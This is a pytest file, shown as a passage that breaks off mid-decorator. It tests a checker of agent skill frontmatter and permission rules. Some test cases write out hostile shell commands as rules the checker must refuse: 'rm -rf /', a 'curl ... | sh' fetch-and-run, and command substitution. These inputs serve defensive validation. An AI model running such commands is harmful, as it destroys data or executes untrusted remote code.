"""scripts/check_skills.py: skill shape and frontmatter."""

import os
from pathlib import Path

import pytest


@pytest.fixture
def skills(repo):
    return repo.script("check_skills")


LINK = "scaffold/acme_root/.claude/skills"
"""Claude Code's folder of the scaffold's skills: a link to the folder every other agent reads."""


@pytest.fixture(autouse=True)
def claude_link(repo):
    """The scaffold's `.claude/skills`, a link to `../.agents/skills`, as the repository has it."""
    link = repo.root / LINK
    link.parent.mkdir(parents=True, exist_ok=True)
    link.symlink_to("../.agents/skills")
    return link


RANKED = "remove the call, fold it into another, defer it, cache its answer, and only then run calls in parallel"


def operational_skills(repo, roles: dict[str, str], ranked: str = RANKED) -> None:
    """Append the guideline's Operational Skills section: its table of roles, and the order an audit of calls ranks."""
    rows = "".join(f"| `{name}` | {role} | what it answers |\n" for name, role in roles.items())
    repo.write(
        "architecture.md",
        repo.read("architecture.md")
        + f"\n## Operations\n\n### Operational Skills\n\n| Skill | Role | Answers |\n|---|---|---|\n{rows}"
        + f"\nAn audit of calls ranks its fixes: {ranked}.\n",
    )


COPIED = "scaffold/acme_root/.agents/skills"
"""Where the scaffold keeps the skills a new tree copies and runs."""


def copied(name: str) -> str:
    """The path of one skill of the scaffold."""
    return f"{COPIED}/{name}/SKILL.md"


def audit(name: str, role: str = "None", ranked: str = RANKED) -> str:
    """An audit skill of the scaffold, with a role section, a step that ranks its fixes, and one that bounds a rerun."""
    return (
        f'---\nname: {name}\ndescription: "Audit {name}."\nallowed-tools: Read, Grep\n---\n\n# {name}\n\n'
        f"## Role and credential\n\n{role}, local only. It holds no credential.\n\n"
        f"## Procedure\n\n1. Make the evidence folder.\n2. Rank each fix: {ranked}.\n"
        "3. Count the calls: the first run plus at most 1 rerun.\n"
    )


def set_description(repo, value: str) -> None:
    text = repo.read("skills/arch-review-full/SKILL.md")
    head, _, tail = text.partition("\ndescription: ")
    _, _, tail = tail.partition("\n")
    repo.write("skills/arch-review-full/SKILL.md", f"{head}\ndescription: {value}\n{tail}")


def test_valid_tree_passes(repo, skills, capsys):
    assert skills.main() == 0
    assert "skills ok: 3 skills, 1 review groups" in capsys.readouterr().out


def test_name_must_equal_folder_and_start_with_arch(repo, skills, capsys):
    repo.edit("skills/arch-review-full/SKILL.md", "name: arch-review-full", "name: review-full")
    assert skills.main() == 1
    out = capsys.readouterr().out
    assert "name 'review-full' differs from folder 'arch-review-full'" in out
    assert "must match" in out


@pytest.mark.parametrize(
    "value, problem",
    [
        ('"Full review', "unterminated quoted value"),
        ('"Full "review" here"', "text after the closing quote"),
        ('"Full review" extra', "text after the closing quote"),
        ('"C:\\path\\to"', "bad escape \\p"),
        ('"code \\x4"', "bad escape \\x4"),
    ],
)
def test_invalid_double_quoted_value_fails(repo, skills, capsys, value, problem):
    set_description(repo, value)
    assert skills.main() == 1
    assert problem in capsys.readouterr().out


@pytest.mark.parametrize(
    "value",
    [
        '"Full \\"review\\": runs arch-review-om."',
        '"Tab\\tand unicode \\u00e9 and \\x41."',
        '"Runs arch-review-om."  # a comment',
    ],
)
def test_valid_double_quoted_value_passes(repo, skills, value):
    set_description(repo, value)
    assert skills.main() == 0


@pytest.mark.parametrize(
    "value",
    ["Full review: runs arch-review-om", "Full review # runs", "'single quoted'", "[a, b]", "> folded", "Runs arch-review-om:"],
)
def test_plain_value_a_strict_loader_would_misread_fails(repo, skills, capsys, value):
    set_description(repo, value)
    assert skills.main() == 1
    assert "must be double-quoted for strict YAML" in capsys.readouterr().out


def test_indented_continuation_and_repeated_key_fail(repo, skills, capsys):
    repo.edit(
        "skills/arch-review-full/SKILL.md",
        "allowed-tools: Read, Agent\n",
        "allowed-tools: Read, Agent\n  Bash\nallowed-tools: Read\n",
    )
    assert skills.main() == 1
    out = capsys.readouterr().out
    assert "frontmatter line is indented" in out
    assert "key 'allowed-tools' repeated" in out


def test_description_limits(repo, skills, capsys):
    set_description(repo, '""')
    assert skills.main() == 1
    assert "empty description" in capsys.readouterr().out
    set_description(repo, '"' + "x" * 500 + '"')
    assert skills.main() == 0
    set_description(repo, '"' + "x" * 501 + '"')
    assert skills.main() == 1
    assert "limit 500" in capsys.readouterr().out


def test_the_descriptions_together_have_a_budget(repo, skills, capsys, monkeypatch):
    monkeypatch.setattr(skills, "DESCRIPTIONS_TOTAL", 100)
    assert skills.main() == 1
    assert "the descriptions total" in capsys.readouterr().out


def test_an_unknown_frontmatter_key_fails(repo, skills, capsys):
    repo.edit("skills/arch-review-full/SKILL.md", "allowed-tools: Read, Agent", "allowed_tools: Read, Agent")
    assert skills.main() == 1
    assert "frontmatter key 'allowed_tools' is neither a field of the Agent Skills standard" in capsys.readouterr().out


@pytest.mark.parametrize("line", ["argument-hint: <scope>", "model: opus", "user-invocable: false", "context: fork"])
def test_a_key_one_agent_alone_reads_fails_in_a_skill_and_in_a_scaffold_skill(repo, skills, capsys, line):
    key = line.partition(":")[0]
    repo.edit("skills/arch-review-full/SKILL.md", "allowed-tools: Read, Agent\n", f"allowed-tools: Read, Agent\n{line}\n")
    repo.write(copied("ops-watch"), f'---\nname: ops-watch\ndescription: "Watch."\nallowed-tools: Read\n{line}\n---\n')
    assert skills.main() == 1
    out = capsys.readouterr().out
    for rel in ("skills/arch-review-full/SKILL.md", copied("ops-watch")):
        assert f"{rel}: frontmatter key {key!r} is neither a field of the Agent Skills standard" in out


def test_the_standards_optional_fields_and_disable_model_invocation_pass(repo, skills):
    fields = 'license: MIT\ncompatibility: "Needs git and Python 3.11."\ndisable-model-invocation: true\n'
    repo.edit("skills/arch-review-full/SKILL.md", "allowed-tools: Read, Agent\n", f"allowed-tools: Read, Agent\n{fields}")
    repo.write(
        copied("ops-cloud-deployment-nuke"),
        f'---\nname: ops-cloud-deployment-nuke\ndescription: "Destroy."\nallowed-tools: Read\n{fields}---\n',
    )
    for folder in ("skills/arch-review-full", f"{COPIED}/ops-cloud-deployment-nuke"):
        repo.write(f"{folder}/agents/openai.yaml", "policy:\n  allow_implicit_invocation: false\n")
    assert skills.main() == 0


def test_a_compatibility_past_the_standards_limit_fails(repo, skills, capsys):
    tools = "allowed-tools: Read, Agent\n"
    repo.edit("skills/arch-review-full/SKILL.md", tools, f"{tools}compatibility: {'x' * 501}\n")
    assert skills.main() == 1
    assert "compatibility is 501 characters; the standard allows 1 to 500" in capsys.readouterr().out


def test_a_scaffold_skill_references_the_conventions(repo, skills, capsys):
    repo.write("skills/_shared/scaffold-conventions.md", "# Conventions\n")
    assert skills.main() == 1
    assert "a scaffold skill references skills/_shared/scaffold-conventions.md" in capsys.readouterr().out
    repo.edit(
        "skills/arch-scaffold-thing/SKILL.md", "## Input\n", "It follows skills/_shared/scaffold-conventions.md.\n\n## Input\n"
    )
    assert skills.main() == 0


def test_allowed_tools_form(repo, skills, capsys):
    repo.edit("skills/arch-review-full/SKILL.md", "allowed-tools: Read, Agent", "allowed-tools: Read Agent")
    assert skills.main() == 1
    assert "must be comma-separated" in capsys.readouterr().out
    repo.edit("skills/arch-review-full/SKILL.md", "allowed-tools: Read Agent", "allowed-tools: Read, Bash(git diff *)")
    assert skills.main() == 1
    assert "Bash(cmd:*) prefix form" in capsys.readouterr().out
    repo.edit("skills/arch-review-full/SKILL.md", "Bash(git diff *)", "Bash")
    assert skills.main() == 1
    assert "a bare Bash is refused" in capsys.readouterr().out
    repo.edit("skills/arch-review-full/SKILL.md", "allowed-tools: Read, Bash", "allowed-tools: Read, Bash(make check )")
    assert skills.main() == 1
    assert "trailing space inside the parentheses of 'Bash(make check )'" in capsys.readouterr().out


def test_an_mcp_tool_name_is_a_name(repo, skills, capsys):
    # a browser or other MCP tool is named `mcp__<server>__<tool>`; that is a Name
    repo.edit(
        "skills/arch-review-full/SKILL.md",
        "allowed-tools: Read, Agent",
        "allowed-tools: Read, Agent, mcp__claude-in-chrome__navigate, mcp__claude-in-chrome__browser_batch",
    )
    assert skills.main() == 0
    repo.edit("skills/arch-review-full/SKILL.md", "mcp__claude-in-chrome__navigate", "mcp__Claude Chrome__navigate")
    assert skills.main() == 1
    assert "is not Name or Name(rule)" in capsys.readouterr().out


def test_make_target_the_body_runs_passes(repo, skills, capsys):
    # the exact form, the prefix form, a target the scaffold conventions file runs
    # on the skill's behalf, and git, uv, and pnpm entries the checker leaves alone
    repo.write("skills/_shared/scaffold-conventions.md", "# Conventions\n\nRun `make migrate` after every table.\n")
    repo.edit(
        "skills/arch-scaffold-thing/SKILL.md",
        "Bash(make check)",
        "Bash(make check), Bash(make migrate-check:*), Bash(make migrate), Bash(git status:*), Bash(uv run:*), Bash(pnpm run:*)",
    )
    repo.edit(
        "skills/arch-scaffold-thing/SKILL.md",
        "2. Run `make check`.",
        "2. Run `make check`, then `make migrate-check --dry-run`.\n"
        "3. Conventions: `../_shared/scaffold-conventions.md`, as `realpath` resolves it.",
    )
    assert skills.main() == 0
    assert "skills ok" in capsys.readouterr().out


def test_make_target_the_body_never_runs_fails(repo, skills, capsys):
    repo.edit(
        "skills/arch-scaffold-thing/SKILL.md", "Bash(make check)", "Bash(make check), Bash(make test-unit), Bash(make openapi:*)"
    )
    assert skills.main() == 1
    out = capsys.readouterr().out
    assert (
        "skills/arch-scaffold-thing/SKILL.md: allowed-tools names Bash(make test-unit) but the body never runs make test-unit"
        in out
    )
    assert "allowed-tools names Bash(make openapi) but the body never runs make openapi" in out
    assert "never runs make check" not in out
    # a target named only in the conventions file counts only when the body references that file
    repo.write("skills/_shared/scaffold-conventions.md", "# Conventions\n\nRun `make test-unit`.\n")
    assert skills.main() == 1
    assert "never runs make test-unit" in capsys.readouterr().out
    # a mention inside a fenced block is a report template, not a run
    repo.edit("skills/arch-scaffold-thing/SKILL.md", "## Output\n", "## Output\n\n```text\nmake test-unit\nmake openapi\n```\n")
    assert skills.main() == 1
    assert "never runs make openapi" in capsys.readouterr().out


def test_a_path_from_the_skills_folder_must_exist(repo, skills, capsys):
    repo.edit("skills/arch-review-om/SKILL.md", "`../../lenses/om.md`", "`../../lenses/om.md` and `../notes.md`")
    assert skills.main() == 1
    assert "skills/arch-review-om/SKILL.md: reference ../notes.md does not exist" in capsys.readouterr().out
    repo.edit("skills/arch-review-om/SKILL.md", "`../notes.md`", "`../../lenses/`, then `../..`.")
    assert skills.main() == 0


@pytest.mark.parametrize("variable", ["${CLAUDE_SKILL_DIR}", "${CLAUDE_PLUGIN_ROOT}", "${CLAUDE_PROJECT_DIR}", "$ARGUMENTS"])
def test_a_substitution_one_agent_makes_fails(repo, skills, capsys, variable):
    repo.edit("skills/arch-review-om/SKILL.md", "`../../lenses/om.md`", f"`{variable}/../../lenses/om.md`")
    repo.write("agents/arch-reviewer.md", f"# Reviewer\n\nRead `{variable}/architecture.md`.\n")
    head = '---\nname: ops-watch\ndescription: "Watch."\nallowed-tools: Read\n---\n'
    repo.write(copied("ops-watch"), f"{head}\nRead `{variable}`.\n")
    assert skills.main() == 1
    out = capsys.readouterr().out
    for rel in ("skills/arch-review-om/SKILL.md", "agents/arch-reviewer.md", copied("ops-watch")):
        assert f"{rel}: names {variable}, a substitution one agent makes and the others read as text" in out


def test_every_group_has_one_review_skill_named_by_full(repo, skills, capsys):
    repo.edit("lenses/README.md", "principles  |\n", "principles  |\n| `ctx` | `context.md` | TenantContext: tenancy |\n")
    assert skills.main() == 1
    out = capsys.readouterr().out
    assert "no arch-review-ctx skill for lens group 'ctx'" in out
    assert "does not name arch-review-ctx" in out


def test_scaffold_sections_must_appear_in_order(repo, skills, capsys):
    text = repo.read("skills/arch-scaffold-thing/SKILL.md")
    swapped = text.replace("## Created", "## TEMP").replace("## Changed", "## Created").replace("## TEMP", "## Changed")
    repo.write("skills/arch-scaffold-thing/SKILL.md", swapped)
    assert skills.main() == 1
    assert "scaffold sections are ['Input', 'Changed', 'Created', 'Procedure', 'Output']" in capsys.readouterr().out
    repo.write(
        "skills/arch-scaffold-thing/SKILL.md", text.replace("## Procedure\n\n1. Write the thing.\n2. Run `make check`.\n\n", "")
    )
    assert skills.main() == 1
    assert "expected ['Input', 'Created', 'Changed', 'Procedure', 'Output']" in capsys.readouterr().out


@pytest.mark.parametrize("rule", ["Bash(*)", "Bash(rm -rf /)", "Bash(curl*)", "Bash(git*:*)", "Bash(make check:*:*)"])
def test_a_bash_rule_in_neither_allowed_form_fails(repo, skills, capsys, rule):
    repo.edit("skills/arch-scaffold-thing/SKILL.md", "Bash(make check)", f"Bash(make check), {rule}")
    assert skills.main() == 1
    assert f"{rule!r} is neither the Bash(cmd:*) prefix form nor an exact Bash(make <target>)" in capsys.readouterr().out


REVIEW = "skills/arch-review-om/SKILL.md"


def test_a_review_skill_runs_the_checker_with_no_local_and_pre_approves_git_alone(repo, skills, capsys):
    repo.edit(REVIEW, "Bash(git diff:*)", "Bash(git diff:*), Bash(git show:*)")
    run = "python3 <arch_check.py> --no-local --root <root> --group om --format json"
    repo.edit(REVIEW, "commit.\n", f"commit.\n\nRun `{run}`.\n")
    assert skills.main() == 0
    # `python3` alone names the interpreter, and a fenced block is a template: neither is a run
    repo.edit(REVIEW, "commit.\n", "commit, on `python3` 3.11.\n\n```text\npython3 x.py\n```\n")
    assert skills.main() == 0
    assert "skills ok" in capsys.readouterr().out


@pytest.mark.parametrize("path", [REVIEW, "skills/arch-review-full/SKILL.md"])
@pytest.mark.parametrize("entry", ["Bash(python3:*)", "Bash(python3 -m pytest:*)", "Bash(uv run:*)", "Bash(git:*)"])
def test_a_review_skill_that_pre_approves_more_than_a_git_command_fails(repo, skills, capsys, path, entry):
    repo.edit(path, "allowed-tools: Read", f"allowed-tools: {entry}, Read")
    assert skills.main() == 1
    assert f"{path}: {entry!r} lets a review run more than a git command with nobody asked" in capsys.readouterr().out


def test_no_rule_names_the_checker_by_the_end_of_its_path(repo, skills, capsys):
    """The host reads a `*` as any text, so such a rule matches `python3 -c "..." x/checkers/arch_check.py` too."""
    entry = "Bash(python3 */checkers/arch_check.py --no-local *)"
    repo.edit(REVIEW, "Bash(git diff:*)", f"Bash(git diff:*), {entry}")
    assert skills.main() == 1
    out = capsys.readouterr().out
    assert f"{REVIEW}: use the Bash(cmd:*) prefix form, not {entry!r}" in out
    assert f"{REVIEW}: {entry!r} lets a review run more than a git command" in out


@pytest.mark.parametrize(
    "command",
    [
        "python3 <arch_check.py> --root <root> --group om --format json",
        "python3 <arch_check.py> --root <root> --format json --no-local",
        "python3 <arch_check.py> --no-locals --root <root>",
        "python3 <arch_check.py> --no-local --group om --format json",
        "python3 <arch_check.py> --no-local --group om --root <root>",
        "python3 tools/rules.py",
    ],
)
def test_a_review_skill_that_runs_python_without_no_local_and_the_root_fails(repo, skills, capsys, command):
    repo.edit(REVIEW, "commit.\n", f"commit.\n\nRun `{command}`.\n")
    assert skills.main() == 1
    assert f"{REVIEW}: `{command}` is not the checker with --no-local and its root" in capsys.readouterr().out


def test_a_make_target_is_matched_as_whole_words(repo, skills, capsys):
    # `make che` is not run by `make check`, and `make test` is not run by `make test-e2e`
    repo.edit("skills/arch-scaffold-thing/SKILL.md", "Bash(make check)", "Bash(make check), Bash(make che), Bash(make test)")
    repo.edit("skills/arch-scaffold-thing/SKILL.md", "2. Run `make check`.", "2. Run `make check` and `make test-e2e`.")
    assert skills.main() == 1
    out = capsys.readouterr().out
    assert "never runs make che" in out
    assert "never runs make test" in out
    repo.edit("skills/arch-scaffold-thing/SKILL.md", "`make test-e2e`", "`make test` and `make che`")
    assert skills.main() == 0


def test_a_reference_in_the_scaffold_conventions_resolves_from_each_including_skill(repo, skills, capsys):
    repo.write(
        "skills/_shared/scaffold-conventions.md", "# Conventions\n\nRead `../../missing.json` as `realpath` resolves it.\n"
    )
    assert skills.main() == 1  # the scaffold does not reference the conventions file yet
    assert "a scaffold skill references skills/_shared/scaffold-conventions.md" in capsys.readouterr().out
    repo.edit(
        "skills/arch-scaffold-thing/SKILL.md",
        "2. Run `make check`.",
        "2. Run `make check`.\n3. Conventions: `../_shared/scaffold-conventions.md`, as `realpath` resolves it.",
    )
    assert skills.main() == 1
    assert (
        "skills/arch-scaffold-thing/SKILL.md (via skills/_shared/scaffold-conventions.md): "
        "reference ../../missing.json does not exist"
    ) in capsys.readouterr().out
    repo.write("missing.json", "{}\n")
    assert skills.main() == 0


@pytest.mark.parametrize("rule", ["Bash(make:*)", "Bash(make -C sub:*)", "Bash(make -k check)"])
def test_a_make_entry_without_a_target_fails(repo, skills, capsys, rule):
    repo.edit("skills/arch-scaffold-thing/SKILL.md", "Bash(make check)", f"Bash(make check), {rule}")
    assert skills.main() == 1
    assert f"{rule!r} names no make target" in capsys.readouterr().out


def test_an_unquoted_description_fails(repo, skills, capsys):
    set_description(repo, "Full review of every group")
    assert skills.main() == 1
    assert "skills/arch-review-full/SKILL.md: description must be one double-quoted string" in capsys.readouterr().out
    set_description(repo, '"Full review of every group"')
    assert skills.main() == 0


def test_a_path_from_the_skills_folder_must_resolve_inside_the_repository(repo, skills, capsys):
    (repo.root.parent / "outside.md").write_text("# Outside\n", encoding="utf-8")
    repo.edit("skills/arch-review-om/SKILL.md", "`../../lenses/om.md`", "`../../lenses/om.md` and `../../../outside.md`")
    assert skills.main() == 1
    assert "reference ../../../outside.md resolves outside the repository" in capsys.readouterr().out
    repo.edit("skills/arch-review-om/SKILL.md", "`../../../outside.md`", "`../../lenses/om.md`")
    assert skills.main() == 0


def test_a_scaffold_section_inside_fenced_code_is_not_a_section(repo, skills, capsys):
    text = repo.read("skills/arch-scaffold-thing/SKILL.md")
    repo.write("skills/arch-scaffold-thing/SKILL.md", text.replace("## Output\n\nOne line.\n", "```text\n## Output\n```\n"))
    assert skills.main() == 1
    assert "scaffold sections are ['Input', 'Created', 'Changed', 'Procedure']" in capsys.readouterr().out
    repo.write("skills/arch-scaffold-thing/SKILL.md", text.replace("## Output\n", "```text\n## Output\n```\n\n## Output\n"))
    assert skills.main() == 0


def test_a_single_allowed_tools_entry_with_a_space_in_its_rule_passes(repo, skills, capsys):
    path = "skills/arch-scaffold-thing/SKILL.md"
    repo.edit(path, "allowed-tools: Read, Write, Bash(make check)", "allowed-tools: Bash(make check)")
    assert skills.main() == 0
    repo.edit(path, "allowed-tools: Bash(make check)", "allowed-tools: Read Bash(make check)")
    assert skills.main() == 1
    assert "allowed-tools must be comma-separated" in capsys.readouterr().out


def test_an_optional_audit_skill_is_held_like_the_others(repo, skills, capsys):
    name = "audit-provider-calls"
    good = audit(name).replace("allowed-tools: Read, Grep", "allowed-tools: Read, Grep, Bash(git:*)")
    operational_skills(repo, {name: "none"})
    repo.write(copied(name), good)
    assert skills.main() == 0
    assert "1 scaffold skills" in capsys.readouterr().out
    repo.write(copied(name), good.replace("Bash(git:*)", "Bash"))
    assert skills.main() == 1
    assert "a bare Bash is refused" in capsys.readouterr().out


def test_a_scaffold_skill_is_held_to_the_skill_frontmatter(repo, skills, capsys):
    good = '---\nname: ops-infra-as-code\ndescription: "Plan."\nallowed-tools: Read, Bash(aws:*)\n---\n\n# ops-infra-as-code\n'
    repo.write(copied("ops-infra-as-code"), good)
    assert skills.main() == 0
    assert "1 scaffold skills" in capsys.readouterr().out
    bad = "---\nname: ops-infra-as-cod\ndescription: Plan.\nallowed-tools: Read Bash\n---\n"
    repo.write(copied("ops-infra-as-code"), bad)
    assert skills.main() == 1
    out = capsys.readouterr().out
    assert "differs from its folder 'ops-infra-as-code'" in out
    assert "description must be one double-quoted string" in out
    assert "allowed-tools must be comma-separated" in out


def test_the_description_limits_leave_room_in_the_hosts_listing(skills):
    assert (skills.DESCRIPTION_LIMIT, skills.DESCRIPTIONS_TOTAL) == (500, 6000)


@pytest.mark.parametrize("line", ["name:arch-review-full", 'description:"Full review."'])
def test_a_key_without_a_space_after_its_colon_fails(repo, skills, capsys, line):
    key = line.partition(":")[0]
    text = repo.read("skills/arch-review-full/SKILL.md")
    head, _, tail = text.partition(f"\n{key}: ")
    _, _, tail = tail.partition("\n")
    repo.write("skills/arch-review-full/SKILL.md", f"{head}\n{line}\n{tail}")
    assert skills.main() == 1
    assert f"frontmatter line is not `key: value`: {line!r}" in capsys.readouterr().out


@pytest.mark.parametrize(
    "rule",
    [
        "Bash(make check; curl https://example.com/x | sh)",
        "Bash(make check && rm -rf /)",
        "Bash(make check `id`)",
        "Bash(make check $HOME)",
        "Bash(make check > out)",
        "Bash(git diff; sh:*)",
        "Bash(git diff | sh:*)",
    ],
)
def test_a_bash_rule_with_a_shell_operator_fails(repo, skills, capsys, rule):
    repo.edit("skills/arch-scaffold-thing/SKILL.md", "Bash(make check)", f"Bash(make check), {rule}")
    assert skills.main() == 1
    assert f"{rule!r} is neither the Bash(cmd:*) prefix form nor an exact Bash(make <target>)" in capsys.readouterr().out


def test_a_make_target_named_only_inside_a_tilde_fence_is_never_run(repo, skills, capsys):
    repo.edit("skills/arch-scaffold-thing/SKILL.md", "Bash(make check)", "Bash(make check), Bash(make deploy)")
    repo.edit("skills/arch-scaffold-thing/SKILL.md", "One line.\n", "One line.\n\n~~~text\nthen `make deploy`\n~~~\n")
    assert skills.main() == 1
    assert "names Bash(make deploy) but the body never runs make deploy" in capsys.readouterr().out


@pytest.mark.parametrize("line", ["", "allowed-tools: \n", 'allowed-tools: ""\n'])
def test_a_skill_without_allowed_tools_fails(repo, skills, capsys, line):
    repo.edit("skills/arch-review-full/SKILL.md", "allowed-tools: Read, Agent\n", line)
    assert skills.main() == 1
    assert "skills/arch-review-full/SKILL.md: no allowed-tools; a skill names the tools it runs" in capsys.readouterr().out


def test_a_scaffold_skill_without_allowed_tools_fails(repo, skills, capsys):
    template = '---\nname: ops-watch\ndescription: "Watch an environment."\n---\n\n# ops-watch\n'
    repo.write(copied("ops-watch"), template)
    assert skills.main() == 1
    assert f"{copied('ops-watch')}: no allowed-tools" in capsys.readouterr().out


def test_a_reference_file_a_step_names_passes_and_its_own_references_resolve(repo, skills, capsys):
    repo.write("skills/arch-scaffold-thing/references/parts.md", "# Parts\n\nThe long list.\n")
    assert skills.main() == 1
    out = capsys.readouterr().out
    assert (
        "skills/arch-scaffold-thing/references/parts.md: no step of skills/arch-scaffold-thing/SKILL.md "
        "names references/parts.md" in out
    )
    repo.edit(
        "skills/arch-scaffold-thing/SKILL.md",
        "1. Write the thing.",
        "1. Read `references/parts.md`, then write the thing.",
    )
    assert skills.main() == 0
    repo.write("skills/arch-scaffold-thing/references/parts.md", "# Parts\n\nRead `references/gone.json`.\n")
    assert skills.main() == 1
    assert (
        "skills/arch-scaffold-thing/references/parts.md: reference references/gone.json does not exist" in capsys.readouterr().out
    )


def test_a_reference_named_outside_the_procedure_is_still_an_orphan(repo, skills, capsys):
    repo.write("skills/arch-scaffold-thing/references/parts.md", "# Parts\n\nThe long list.\n")
    repo.edit(
        "skills/arch-scaffold-thing/SKILL.md",
        "| `thing.py` | the thing |",
        "| `thing.py` | the thing, listed in `references/parts.md` |",
    )
    assert skills.main() == 1
    assert "names references/parts.md" in capsys.readouterr().out


def test_a_body_over_the_word_bound_fails(repo, skills, capsys):
    filler = ("word " * 40).strip()
    repo.edit("skills/arch-scaffold-thing/SKILL.md", "One line.\n", "One line.\n\n" + f"{filler}\n" * 73)
    assert skills.main() == 0
    repo.edit("skills/arch-scaffold-thing/SKILL.md", "One line.\n", "One line.\n\n" + f"{filler}\n")
    assert skills.main() == 1
    assert (
        "skills/arch-scaffold-thing/SKILL.md: the body is 3007 words, limit 3000; "
        "move the long per-step material into skills/arch-scaffold-thing/references/ "
        "and have the step that reads it name the file" in capsys.readouterr().out
    )


def test_an_audit_states_the_role_the_operational_skills_table_gives_it(repo, skills, capsys):
    operational_skills(repo, {"audit-database-calls": "none", "audit-retention": "investigator"})
    repo.write(copied("audit-database-calls"), audit("audit-database-calls"))
    repo.write(copied("audit-retention"), audit("audit-retention", role="Investigator, read-only"))
    assert skills.main() == 0
    repo.write(copied("audit-database-calls"), audit("audit-database-calls", role="Investigator"))
    assert skills.main() == 1
    assert (
        f"{copied('audit-database-calls')}: Role and credential opens with the role 'investigator'; "
        "the Operational Skills table gives 'none'" in capsys.readouterr().out
    )


def test_an_audit_missing_from_either_side_fails(repo, skills, capsys):
    operational_skills(repo, {"audit-retention": "investigator"})
    repo.write(copied("audit-database-calls"), audit("audit-database-calls"))
    assert skills.main() == 1
    out = capsys.readouterr().out
    assert "architecture.md: the Operational Skills table lists audit-retention, which the scaffold has no skill for" in out
    assert f"{copied('audit-database-calls')}: the Operational Skills table of architecture.md gives it no role" in out


def test_an_audit_with_no_operational_skills_section_fails(repo, skills, capsys):
    repo.write(copied("audit-database-calls"), audit("audit-database-calls"))
    assert skills.main() == 1
    assert "architecture.md: no Operational Skills section to hold the audit skills to" in capsys.readouterr().out


@pytest.mark.parametrize(
    "ranked",
    [
        "remove the call, fold it into another, or defer it, before running reads in parallel",
        "remove the call, cache its answer, fold it into another, defer it, and only then run calls in parallel",
    ],
)
def test_an_audit_that_ranks_parallel_calls_out_of_order_fails(repo, skills, capsys, ranked):
    operational_skills(repo, {"audit-database-calls": "none"})
    repo.write(copied("audit-database-calls"), audit("audit-database-calls", ranked=ranked))
    assert skills.main() == 1
    assert (
        f"{copied('audit-database-calls')}: names parallel calls without ranking "
        "remove, fold, defer, cache, parallel first, in that order" in capsys.readouterr().out
    )


def test_a_numbered_step_is_read_on_its_own_so_a_folder_is_no_fold(repo, skills):
    operational_skills(repo, {"audit-database-calls": "none"})
    template = audit("audit-database-calls").replace(
        "1. Make the evidence folder.", "1. Make the evidence folder and\n   write in it."
    )
    repo.write(copied("audit-database-calls"), template)
    assert skills.main() == 0


def test_the_operational_skills_text_is_held_to_the_same_order(repo, skills, capsys):
    operational_skills(
        repo, {"audit-database-calls": "none"}, ranked="remove, fold, and defer a call before running calls in parallel"
    )
    repo.write(copied("audit-database-calls"), audit("audit-database-calls"))
    assert skills.main() == 1
    assert "architecture.md: Operational Skills names parallel calls without ranking" in capsys.readouterr().out


RULE = "A work row is done once its\nitem is queued."


RELAY = "scaffold/acme_root/om/src/acme/om/outbox/relay.py"


def test_the_work_row_rule_is_said_in_the_text_the_lens_and_the_scaffolds_relay(repo, skills, capsys):
    repo.edit("architecture.md", "One table per entity.\n", f"One table per entity.\n\n{RULE}\n")
    assert skills.main() == 0  # no `work.<kind>` row in the guideline, so no rule to hold the others to
    repo.edit("architecture.md", RULE, f"A `work.<kind>` row starts work. {RULE}")
    assert skills.main() == 1
    out = capsys.readouterr().out
    for rel in ("lenses/storage.md", RELAY):
        assert f"{rel}: does not say 'a work row is done once its item is queued'" in out
    repo.write("lenses/storage.md", f"## STO-20 A handoff\n\n{RULE}\n")
    repo.write(RELAY, f'class OutboxRelayInterface:\n    """The row is then marked done.\n    {RULE}"""\n')
    assert skills.main() == 0
    repo.edit(RELAY, "once its\nitem is queued", "once its wake is taken")
    assert skills.main() == 1
    assert (
        f"{RELAY}: does not say 'a work row is done once its item is queued'; "
        "the text, STO-20, and the scaffold's relay must each say it" in capsys.readouterr().out
    )


def test_a_scaffold_skill_may_name_a_connectors_tool_in_any_case(repo, skills, capsys):
    good = (
        '---\nname: tickets-triage\ndescription: "Triage the tickets."\n'
        "allowed-tools: Read, mcp__claude_ai_Tracker__list_issues, mcp__tracker-2__get_issue\n---\n\n# tickets-triage\n"
    )
    repo.write(copied("tickets-triage"), good)
    assert skills.main() == 0
    repo.write(copied("tickets-triage"), good.replace("mcp__tracker-2__get_issue", "mcp__tracker get_issue"))
    assert skills.main() == 1
    assert "allowed-tools must be comma-separated" in capsys.readouterr().out


def test_the_scaffolds_shared_text_is_no_skill_and_is_held_to_the_bound(repo, skills, capsys):
    repo.write(f"{COPIED}/_shared/ops-preamble.md", "# The preamble\n\nRead it once.\n")
    assert skills.main() == 0
    assert "0 scaffold skills" in capsys.readouterr().out
    repo.write(f"{COPIED}/_shared/ops-preamble.md", "# The preamble\n\n1. Run `make check` and fix what it reports.\n")
    assert skills.main() == 1
    assert f"{COPIED}/_shared/ops-preamble.md: a step fixes and runs again with no count bound" in capsys.readouterr().out


def test_a_scaffold_skill_folder_with_no_skill_fails(repo, skills, capsys):
    repo.write(f"{COPIED}/ops-watch/references/notes.md", "# Notes\n")
    assert skills.main() == 1
    assert f"{COPIED}/ops-watch: no SKILL.md" in capsys.readouterr().out


CONVENTIONS = "skills/_shared/scaffold-conventions.md"


def conventions(repo, text: str) -> None:
    """Write the scaffold conventions and have the scaffold reference them, so only `text` can fail."""
    repo.write(CONVENTIONS, f"# Conventions\n\n{text}")
    if CONVENTIONS not in repo.read("skills/arch-scaffold-thing/SKILL.md"):
        repo.edit("skills/arch-scaffold-thing/SKILL.md", "One line.\n", f"One line.\n\nConventions: `{CONVENTIONS}`.\n")


def test_a_step_that_fixes_and_runs_a_gate_again_states_its_bound(repo, skills, capsys):
    repo.edit("skills/arch-scaffold-thing/SKILL.md", "2. Run `make check`.", "2. Run `make check` and fix what it reports.")
    assert skills.main() == 1
    assert (
        "skills/arch-scaffold-thing/SKILL.md: a step fixes and runs again with no count bound; "
        "say 'the first run plus at most <n> reruns' in it: '2. Run `make check` and fix what it reports.'"
        in capsys.readouterr().out
    )
    repo.edit(
        "skills/arch-scaffold-thing/SKILL.md",
        "fix what it reports.",
        "fix what it reports: the first run plus at most 3\n   reruns, then stop and say which gate fails and why.",
    )
    assert skills.main() == 0


@pytest.mark.parametrize(
    "said",
    [
        "Fix the file and rerun it alone.",
        "Fix the failure and re-run the suite.",
        "Fix it in place, and run step 8\n   again.",
        "Fix the failure and run `uv run pytest tests/test_x.py` again.",
        "Fix the file and run the check (e.g. `pytest -q`) again.",
        "Fix it and run the suite, i.e. the integration tests, again.",
        "Fix it and run the suite, e.g. Playwright, again.",
        "Fix it and run the type check, i.e. Pyright, again.",
        "Fix it and run the tests vs. Postgres again.",
    ],
)
